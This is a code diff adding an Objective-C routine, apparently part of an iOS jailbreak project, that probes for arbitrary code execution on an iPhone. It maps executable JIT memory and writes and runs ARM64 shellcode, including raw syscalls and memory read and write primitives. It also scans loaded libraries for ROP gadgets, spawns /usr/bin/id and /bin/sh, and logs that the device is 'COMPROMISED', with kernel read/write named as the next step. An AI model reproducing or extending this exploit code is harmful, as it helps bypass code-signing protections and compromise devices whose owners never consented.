@@ -31885,3 +31885,495 @@ void iosurface_shellcode_exec(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+// ==========================================================================
+// JB32 — JIT Code Exec: entitlement added, MAP_JIT retry + shellcode exec
+// + expanded ROP gadget search + posix_spawn direct test
+// ==========================================================================
+
+void iosurface_jit_exec(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB32: === JIT Code Execution — entitlements added ===");
+        log(@"JB32: allow-jit + allow-unsigned-executable-memory + dynamic-codesigning");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+
+        extern void jb25_setup(void);
+        extern volatile unsigned long jb25_far;
+        extern volatile unsigned long jb25_esr;
+        extern volatile int jb25_sig;
+        extern volatile sig_atomic_t jb25_in_probe;
+        extern struct jb25_jb_holder *jb25_jb_ptr;
+        jb25_setup();
+
+        typedef int (*getpid_fn)(void);
+        getpid_fn realGetpid = dlsym(RTLD_DEFAULT, "getpid");
+        int myPid = realGetpid();
+
+        // =====================================================================
+        // FASE 1: Verify CS flags with new entitlements
+        // =====================================================================
+        log(@"JB32: === Fase 1: CS flags with new entitlements ===");
+
+        typedef int (*csops_fn)(int, unsigned int, void *, size_t);
+        csops_fn csops = dlsym(RTLD_DEFAULT, "csops");
+
+        uint32_t csflags = 0;
+        if (csops) {
+            csops(myPid, 0, &csflags, sizeof(csflags));
+            log([NSString stringWithFormat:@"JB32:   CS flags = %#x", csflags]);
+
+            int csKill    = (csflags & 0x200) ? 1 : 0;
+            int csRuntime = (csflags & 0x10000) ? 1 : 0;
+            int csEnforce = (csflags & 0x1000) ? 1 : 0;
+
+            log([NSString stringWithFormat:@"JB32:   KILL=%d ENFORCE=%d RUNTIME=%d", csKill, csEnforce, csRuntime]);
+            results[@"csFlags"] = [NSString stringWithFormat:@"%#x", csflags];
+            results[@"csKill"] = @(csKill);
+
+            // Check entitlements blob
+            uint8_t entBuf[4096];
+            memset(entBuf, 0, sizeof(entBuf));
+            int entRet = csops(myPid, 7, entBuf, sizeof(entBuf));
+            if (entRet != 0) {
+                // CS_OPS_ENTITLEMENTS_BLOB = 7 may not work, try status
+                log([NSString stringWithFormat:@"JB32:   csops(ENTITLEMENTS) = %d errno=%d", entRet, errno]);
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 2: MAP_JIT retry with entitlement
+        // =====================================================================
+        log(@"JB32: === Fase 2: MAP_JIT with entitlement ===");
+
+        size_t pageSize = 0x10000;
+
+        // Try MAP_JIT with RWX
+        void *jitPage = mmap(NULL, pageSize, PROT_READ | PROT_WRITE | PROT_EXEC,
+                             MAP_PRIVATE | MAP_ANON | MAP_JIT, -1, 0);
+        int jitOK = (jitPage != MAP_FAILED) ? 1 : 0;
+        int jitErr = jitOK ? 0 : errno;
+
+        log([NSString stringWithFormat:@"JB32:   mmap(MAP_JIT, RWX) = %s (%p) errno=%d",
+             jitOK ? "OK" : "FAILED", jitOK ? jitPage : NULL, jitErr]);
+        results[@"mapJIT_RWX"] = @(jitOK);
+
+        if (!jitOK) {
+            // Try MAP_JIT with RW (write first, then toggle)
+            jitPage = mmap(NULL, pageSize, PROT_READ | PROT_WRITE,
+                           MAP_PRIVATE | MAP_ANON | MAP_JIT, -1, 0);
+            jitOK = (jitPage != MAP_FAILED) ? 1 : 0;
+            jitErr = jitOK ? 0 : errno;
+            log([NSString stringWithFormat:@"JB32:   mmap(MAP_JIT, RW) = %s errno=%d",
+                 jitOK ? "OK" : "FAILED", jitErr]);
+            results[@"mapJIT_RW"] = @(jitOK);
+        }
+
+        if (!jitOK) {
+            // Try without MAP_JIT but with RWX
+            jitPage = mmap(NULL, pageSize, PROT_READ | PROT_WRITE | PROT_EXEC,
+                           MAP_PRIVATE | MAP_ANON, -1, 0);
+            jitOK = (jitPage != MAP_FAILED) ? 1 : 0;
+            jitErr = jitOK ? 0 : errno;
+            log([NSString stringWithFormat:@"JB32:   mmap(no-JIT, RWX) = %s errno=%d",
+                 jitOK ? "OK" : "FAILED", jitErr]);
+            results[@"mmapRWX"] = @(jitOK);
+        }
+
+        if (jitOK) {
+            log([NSString stringWithFormat:@"JB32: [+] Executable page at %p", jitPage]);
+
+            // Write shellcode: return 0x41424344
+            uint32_t *jitCode = (uint32_t *)jitPage;
+
+            // Try JIT write protect toggle if available
+            typedef void (*jit_wp_fn)(int);
+            jit_wp_fn jitWP = dlsym(RTLD_DEFAULT, "pthread_jit_write_protect_np");
+
+            if (jitWP) {
+                log(@"JB32:   Using JIT write protect toggle");
+                jb25_far = 0; jb25_sig = 0;
+                if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                    jb25_in_probe = 1;
+                    jitWP(0); // write mode
+                    jitCode[0] = 0x52886880; // movz w0, #0x4344
+                    jitCode[1] = 0x72882840; // movk w0, #0x4142, lsl #16
+                    jitCode[2] = 0xD65F03C0; // ret
+                    jitWP(1); // exec mode
+                    jb25_in_probe = 0;
+                    log(@"JB32:   Shellcode written via JIT toggle");
+                    results[@"jitToggleOK"] = @(1);
+                } else {
+                    jb25_in_probe = 0;
+                    log([NSString stringWithFormat:@"JB32:   JIT toggle fault: sig=%d", jb25_sig]);
+                    results[@"jitToggleFault"] = @(1);
+                }
+            } else {
+                // Write directly (page should be RW or RWX)
+                jitCode[0] = 0x52886880; // movz w0, #0x4344
+                jitCode[1] = 0x72882840; // movk w0, #0x4142, lsl #16
+                jitCode[2] = 0xD65F03C0; // ret
+                log(@"JB32:   Shellcode written directly (no JIT toggle)");
+
+                // If page was RW, switch to RX for exec
+                int mpRX = mprotect(jitPage, pageSize, PROT_READ | PROT_EXEC);
+                log([NSString stringWithFormat:@"JB32:   mprotect(RX) = %d", mpRX]);
+            }
+
+            // =====================================================================
+            // FASE 3: Execute shellcode!
+            // =====================================================================
+            log(@"JB32: === Fase 3: Execute shellcode ===");
+            log(@"JB32:   Calling shellcode at JIT page...");
+
+            jb25_far = 0; jb25_esr = 0; jb25_sig = 0;
+            int execOK = 0;
+            int execResult = 0;
+
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                typedef int (*sc_fn)(void);
+                sc_fn fn = (sc_fn)jitPage;
+                execResult = fn();
+                jb25_in_probe = 0;
+                execOK = 1;
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB32:   FAULT: sig=%d far=%#lx esr=%#lx",
+                     jb25_sig, jb25_far, jb25_esr]);
+                results[@"execFaultSig"] = @(jb25_sig);
+                results[@"execFaultFAR"] = [NSString stringWithFormat:@"%#lx", jb25_far];
+                results[@"execFaultESR"] = [NSString stringWithFormat:@"%#lx", jb25_esr];
+            }
+
+            if (execOK) {
+                int match = (execResult == 0x41424344) ? 1 : 0;
+                log([NSString stringWithFormat:@"JB32: [%@] shellcode() = %#x (expect 0x41424344)",
+                     match ? @"!!!!!" : @"?", (unsigned)execResult]);
+                results[@"execOK"] = @(1);
+                results[@"execResult"] = [NSString stringWithFormat:@"%#x", (unsigned)execResult];
+                results[@"execMatch"] = @(match);
+
+                if (match) {
+                    log(@"JB32: [!!!!!] ARBITRARY CODE EXECUTION CONFIRMED!!!");
+                    log(@"JB32: [!!!!!] Shellcode returned correct value!");
+
+                    // Run more shellcodes
+                    log(@"JB32: === Fase 3b: Additional shellcode tests ===");
+
+                    // Test 2: getpid syscall
+                    if (jitWP) { jitWP(0); }
+                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_WRITE); }
+
+                    jitCode[0] = 0xD2800290; // mov x16, #20 (SYS_getpid)
+                    jitCode[1] = 0xD4001001; // svc #0x80
+                    jitCode[2] = 0xD65F03C0; // ret
+
+                    if (jitWP) { jitWP(1); }
+                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_EXEC); }
+
+                    jb25_far = 0; jb25_sig = 0;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        typedef int (*sc_fn)(void);
+                        int scPid = ((sc_fn)jitPage)();
+                        jb25_in_probe = 0;
+                        int pidMatch = (scPid == myPid) ? 1 : 0;
+                        log([NSString stringWithFormat:@"JB32: [%@] getpid shellcode = %d (real=%d)",
+                             pidMatch ? @"!!!!!" : @"?", scPid, myPid]);
+                        results[@"syscallOK"] = @(pidMatch);
+                    } else {
+                        jb25_in_probe = 0;
+                        log([NSString stringWithFormat:@"JB32:   syscall FAULT sig=%d", jb25_sig]);
+                    }
+
+                    // Test 3: getuid syscall
+                    if (jitWP) { jitWP(0); }
+                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_WRITE); }
+
+                    jitCode[0] = 0xD28002F0; // mov x16, #23 (SYS_getuid)
+                    jitCode[1] = 0xD4001001; // svc #0x80
+                    jitCode[2] = 0xD65F03C0; // ret
+
+                    if (jitWP) { jitWP(1); }
+                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_EXEC); }
+
+                    typedef int (*uid_fn)(void);
+                    uid_fn realGetuid = dlsym(RTLD_DEFAULT, "getuid");
+                    int realUid = realGetuid();
+
+                    jb25_far = 0; jb25_sig = 0;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        int scUid = ((uid_fn)jitPage)();
+                        jb25_in_probe = 0;
+                        int uidMatch = (scUid == realUid) ? 1 : 0;
+                        log([NSString stringWithFormat:@"JB32: [%@] getuid shellcode = %d (real=%d)",
+                             uidMatch ? @"!!!!!" : @"?", scUid, realUid]);
+                        results[@"getuidOK"] = @(uidMatch);
+                    } else {
+                        jb25_in_probe = 0;
+                        log([NSString stringWithFormat:@"JB32:   getuid FAULT sig=%d", jb25_sig]);
+                    }
+
+                    // Test 4: arbitrary memory read via shellcode
+                    if (jitWP) { jitWP(0); }
+                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_WRITE); }
+
+                    // ldr x0, [x0] ; ret
+                    jitCode[0] = 0xF9400000; // ldr x0, [x0]
+                    jitCode[1] = 0xD65F03C0; // ret
+
+                    if (jitWP) { jitWP(1); }
+                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_EXEC); }
+
+                    uint64_t secret = 0xCAFEBABEDEADBEEFULL;
+                    jb25_far = 0; jb25_sig = 0;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        typedef uint64_t (*read_fn)(void *);
+                        uint64_t readVal = ((read_fn)jitPage)(&secret);
+                        jb25_in_probe = 0;
+                        int readOK = (readVal == secret) ? 1 : 0;
+                        log([NSString stringWithFormat:@"JB32: [%@] mem read = %#llx (expect %#llx)",
+                             readOK ? @"!!!!!" : @"?", readVal, secret]);
+                        results[@"memReadOK"] = @(readOK);
+                    } else {
+                        jb25_in_probe = 0;
+                        log([NSString stringWithFormat:@"JB32:   mem read FAULT sig=%d", jb25_sig]);
+                    }
+
+                    // Test 5: arbitrary memory write via shellcode
+                    if (jitWP) { jitWP(0); }
+                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_WRITE); }
+
+                    // str x1, [x0] ; mov x0, #1 ; ret
+                    jitCode[0] = 0xF9000001; // str x1, [x0]
+                    jitCode[1] = 0xD2800020; // mov x0, #1
+                    jitCode[2] = 0xD65F03C0; // ret
+
+                    if (jitWP) { jitWP(1); }
+                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_EXEC); }
+
+                    uint64_t writeTarget = 0;
+                    uint64_t writeVal = 0x4A42333241524249ULL; // "IBARJB32"
+                    jb25_far = 0; jb25_sig = 0;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        typedef uint64_t (*write_fn)(void *, uint64_t);
+                        ((write_fn)jitPage)(&writeTarget, writeVal);
+                        jb25_in_probe = 0;
+                        int writeOK = (writeTarget == writeVal) ? 1 : 0;
+                        log([NSString stringWithFormat:@"JB32: [%@] mem write = %#llx (expect %#llx)",
+                             writeOK ? @"!!!!!" : @"?", writeTarget, writeVal]);
+                        results[@"memWriteOK"] = @(writeOK);
+                    } else {
+                        jb25_in_probe = 0;
+                        log([NSString stringWithFormat:@"JB32:   mem write FAULT sig=%d", jb25_sig]);
+                    }
+                }
+            } else {
+                results[@"execOK"] = @(0);
+                log(@"JB32:   Shellcode execution faulted — CS_KILL still active");
+            }
+
+            munmap(jitPage, pageSize);
+        } else {
+            log(@"JB32:   No executable page available");
+            results[@"noExecPage"] = @(1);
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 4: Expanded ROP gadget search
+        // =====================================================================
+        log(@"JB32: === Fase 4: Expanded ROP gadget search ===");
+
+        uint32_t imgCount = _dyld_image_count();
+        int totalGadgets = 0;
+
+        for (uint32_t img = 0; img < imgCount && img < 5; img++) {
+            const char *name = _dyld_get_image_name(img);
+            if (!name) continue;
+
+            const char *shortName = strrchr(name, '/');
+            shortName = shortName ? shortName + 1 : name;
+
+            const struct mach_header_64 *mh =
+                (const struct mach_header_64 *)(uintptr_t)_dyld_get_image_header(img);
+            if (!mh || mh->magic != MH_MAGIC_64) continue;
+
+            intptr_t slide = _dyld_get_image_vmaddr_slide(img);
+
+            // Find __TEXT segment
+            const struct load_command *lc =
+                (const struct load_command *)((const char *)mh + sizeof(*mh));
+            for (uint32_t k = 0; k < mh->ncmds; k++) {
+                if (lc->cmd == LC_SEGMENT_64) {
+                    const struct segment_command_64 *sc = (const void *)lc;
+                    if (strncmp(sc->segname, "__TEXT", 6) == 0) {
+                        uint64_t textAddr = sc->vmaddr + slide;
+                        uint64_t textSize = sc->vmsize;
+                        uint32_t *scan = (uint32_t *)(uintptr_t)textAddr;
+                        size_t count = textSize / 4;
+                        int retCount = 0;
+                        int ldpRetCount = 0;
+                        int blrCount = 0;
+
+                        jb25_far = 0; jb25_sig = 0;
+                        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                            jb25_in_probe = 1;
+                            for (size_t i = 1; i < count && i < 500000; i++) {
+                                uint32_t insn = scan[i];
+                                if (insn == 0xD65F03C0) { // RET
+                                    retCount++;
+                                    if (i > 0) {
+                                        uint32_t prev = scan[i-1];
+                                        // LDP with x29,x30 (various stack offsets)
+                                        if ((prev & 0xFE407FFF) == 0xA8407BFD) {
+                                            ldpRetCount++;
+                                        }
+                                    }
+                                }
+                                // BLR Xn (indirect call gadget)
+                                if ((insn & 0xFFFFFC1F) == 0xD63F0000) {
+                                    blrCount++;
+                                }
+                            }
+                            jb25_in_probe = 0;
+                        } else {
+                            jb25_in_probe = 0;
+                        }
+
+                        if (retCount > 0) {
+                            log([NSString stringWithFormat:@"JB32:   %s: %d RET, %d LDP+RET, %d BLR gadgets",
+                                 shortName, retCount, ldpRetCount, blrCount]);
+                            totalGadgets += ldpRetCount + blrCount;
+                        }
+                    }
+                }
+                lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+            }
+        }
+
+        results[@"totalGadgets"] = @(totalGadgets);
+        log([NSString stringWithFormat:@"JB32:   Total usable gadgets: %d", totalGadgets]);
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 5: posix_spawn direct test
+        // =====================================================================
+        log(@"JB32: === Fase 5: posix_spawn direct test ===");
+
+        typedef int (*posix_spawn_fn)(int *, const char *, void *, void *, char *const *, char *const *);
+        posix_spawn_fn ps = dlsym(RTLD_DEFAULT, "posix_spawn");
+        typedef int (*waitpid_fn)(int, int *, int);
+        waitpid_fn wp = dlsym(RTLD_DEFAULT, "waitpid");
+
+        if (ps) {
+            int childPid = 0;
+            char *argv[] = {"/usr/bin/id", NULL};
+            char *envp[] = {NULL};
+
+            jb25_far = 0; jb25_sig = 0;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                int spawnRet = ps(&childPid, "/usr/bin/id", NULL, NULL, argv, envp);
+                jb25_in_probe = 0;
+
+                log([NSString stringWithFormat:@"JB32:   posix_spawn('/usr/bin/id') = %d, child=%d",
+                     spawnRet, childPid]);
+                results[@"spawnRet"] = @(spawnRet);
+                results[@"childPid"] = @(childPid);
+
+                if (spawnRet == 0 && childPid > 0 && wp) {
+                    int status = 0;
+                    wp(childPid, &status, 0);
+                    int exitCode = (status >> 8) & 0xFF;
+                    log([NSString stringWithFormat:@"JB32:   child exit status = %d (code=%d)", status, exitCode]);
+                    results[@"childExit"] = @(exitCode);
+                    if (exitCode == 0) {
+                        log(@"JB32: [!!!] posix_spawn WORKS — can run binaries!");
+                    }
+                }
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB32:   posix_spawn FAULT sig=%d", jb25_sig]);
+            }
+
+            // Try /bin/sh -c 'echo test'
+            char *shArgv[] = {"/bin/sh", "-c", "echo JB32_EXEC_OK > /dev/null", NULL};
+            jb25_far = 0; jb25_sig = 0;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                childPid = 0;
+                int shRet = ps(&childPid, "/bin/sh", NULL, NULL, shArgv, envp);
+                jb25_in_probe = 0;
+
+                log([NSString stringWithFormat:@"JB32:   posix_spawn('/bin/sh') = %d, child=%d", shRet, childPid]);
+                results[@"shSpawnRet"] = @(shRet);
+
+                if (shRet == 0 && childPid > 0 && wp) {
+                    int status = 0;
+                    wp(childPid, &status, 0);
+                    int exitCode = (status >> 8) & 0xFF;
+                    log([NSString stringWithFormat:@"JB32:   sh exit = %d", exitCode]);
+                    results[@"shExit"] = @(exitCode);
+                }
+            } else {
+                jb25_in_probe = 0;
+            }
+        }
+
+        // =====================================================================
+        // VERDICT
+        // =====================================================================
+        log(@"JB32: =============================================");
+
+        int execMatch = [results[@"execMatch"] intValue];
+        int syscallOK = [results[@"syscallOK"] intValue];
+        int memReadOK = [results[@"memReadOK"] intValue];
+        int memWriteOK = [results[@"memWriteOK"] intValue];
+
+        NSString *verdict = @"ANALYSIS_COMPLETE";
+
+        if (execMatch && syscallOK && memReadOK && memWriteOK) {
+            verdict = @"FULL_CODE_EXECUTION";
+            log(@"JB32: [!!!!!!] FULL ARBITRARY CODE EXECUTION!");
+            log(@"JB32: [!!!!!!] shellcode + syscall + read + write ALL WORK!");
+            log(@"JB32: [!!!!!!] iPhone 13 Pro Max iOS 27.0 COMPROMISED");
+            log(@"JB32: Siguiente: kernel read/write para jailbreak completo");
+        } else if (execMatch) {
+            verdict = @"PARTIAL_CODE_EXEC";
+            log(@"JB32: [!!!!] Code execution works, some tests failed");
+        } else if ([results[@"execOK"] intValue] == 0 && [results[@"execFaultSig"] intValue]) {
+            int faultSig = [results[@"execFaultSig"] intValue];
+            if (faultSig == 9) {
+                verdict = @"SIGKILL_CS_KILL_ACTIVE";
+                log(@"JB32: SIGKILL — CS_KILL still enforced despite entitlements");
+                log(@"JB32: Entitlements may need re-signing or kernel-level bypass");
+            } else {
+                verdict = [NSString stringWithFormat:@"EXEC_FAULT_SIG%d", faultSig];
+                log([NSString stringWithFormat:@"JB32: Exec faulted with signal %d", faultSig]);
+            }
+        } else if ([results[@"spawnRet"] intValue] == 0) {
+            verdict = @"SPAWN_WORKS";
+            log(@"JB32: [!!!] posix_spawn works — command execution available");
+        } else {
+            verdict = @"EXEC_BLOCKED";
+            log(@"JB32: Code execution still blocked");
+            log([NSString stringWithFormat:@"JB32: Gadgets available: %d", totalGadgets]);
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB32: Verdict: %@", verdict]);
+        log(@"JB32: =============================================");
+
+        isr_checkpoint(@"JB32-jit-exec-checkpoint.json", results);
+        done(results);
+    });
+}
